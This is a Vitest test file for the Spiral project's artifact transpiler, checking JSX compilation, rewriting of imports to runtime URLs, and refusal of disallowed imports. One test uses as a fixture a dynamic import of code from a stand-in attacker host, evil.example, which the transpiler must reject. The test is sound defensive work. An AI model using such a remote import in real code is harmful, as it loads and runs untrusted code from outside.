/*
Copyright 2026 the Spiral authors. AGPL-3.0-or-later.

Brief 0066. The transpile step is the only place an artifact's text is
interpreted before it runs, so its refusals are a contract, not an
optimisation.
*/

import { beforeAll, describe, expect, it } from "vitest";

import { TranspileError, initTranspiler, transpile } from "./transpile";

beforeAll(async () => {
  await initTranspiler();
});

describe("transpile", () => {
  it("compiles JSX to the automatic runtime", () => {
    const out = transpile(`export default () => <div>hi</div>;`, "app.jsx");
    expect(out).toContain("/runtime/v1/react.js");
    expect(out).not.toContain("<div>");
  });

  it("rewrites bare react imports to the shipped runtime", () => {
    const out = transpile(
      `import { useState } from "react";\nexport default () => useState(0);`,
      "app.jsx",
    );
    expect(out).toContain(`from "/runtime/v1/react.js"`);
    expect(out).not.toContain(`from "react"`);
  });

  it("rewrites the sdk and ui specifiers", () => {
    const out = transpile(
      `import { useSharedState } from "@spiral/sdk";\n` +
        `import { Button } from "@spiral/ui";\n` +
        `export default () => [useSharedState, Button];`,
      "app.jsx",
    );
    expect(out).toContain(`"/runtime/v1/sdk.js"`);
    expect(out).toContain(`"/runtime/v1/ui.js"`);
  });

  it("strips TypeScript annotations", () => {
    const out = transpile(
      `const n: number = 1; export default (): number => n;`,
      "app.jsx",
    );
    expect(out).not.toContain(": number");
  });

  it("refuses an import the runtime does not provide", () => {
    expect(() =>
      transpile(`import x from "lodash"; export default () => x;`, "app.jsx"),
    ).toThrow(TranspileError);
  });

  it("refuses a relative import, because v1 is one module per artifact", () => {
    expect(() =>
      transpile(`import x from "./helper.js"; export default () => x;`, "app.jsx"),
    ).toThrow(TranspileError);
  });

  it("refuses a dynamic import with a computed specifier", () => {
    expect(() =>
      transpile(`export default () => import(globalThis.x);`, "app.jsx"),
    ).toThrow(TranspileError);
  });

  it("refuses a remote dynamic import", () => {
    expect(() =>
      transpile(`export default () => import("https://evil.example/x.js");`, "app.jsx"),
    ).toThrow(TranspileError);
  });

  /**
   * Regression: the first implementation matched specifiers with a regular
   * expression and threw on this input, because `from ", "` appears inside a
   * string literal. The lexer-based version must leave literals alone.
   */
  it("does not mistake a string literal for an import specifier", () => {
    const source = `
      const names = ["a", "b"];
      const joined = names.join(", ");
      const label = 'imported from "somewhere"';
      export default () => joined + label;
    `;
    const out = transpile(source, "app.jsx");
    expect(out).toContain(`join(", ")`);
    expect(out).toContain(`imported from`);
  });

  /**
   * Regression: compiled artifacts run via `import(blob:…)`, and a blob URL
   * has an opaque path, so a root-relative specifier has nothing to resolve
   * against — WebKit threw "does not resolve to a valid URL". The rewrite
   * must emit an absolute URL.
   */
  it("rewrites to an absolute URL so a blob module can resolve it", () => {
    const out = transpile(
      `import { useState } from "react"; export default () => useState(0);`,
      "app.jsx",
      "spiral-app://a-abc123",
    );
    expect(out).toContain(`"spiral-app://a-abc123/runtime/v1/react.js"`);
  });

  it("leaves an already-resolved runtime path untouched", () => {
    const out = transpile(
      `import { jsx } from "/runtime/v1/react.js"; export default () => jsx;`,
      "app.jsx",
    );
    expect(out).toContain(`"/runtime/v1/react.js"`);
  });

  it("reports a syntax error as a TranspileError", () => {
    expect(() => transpile(`export default () => {`, "app.jsx")).toThrow(TranspileError);
  });
});
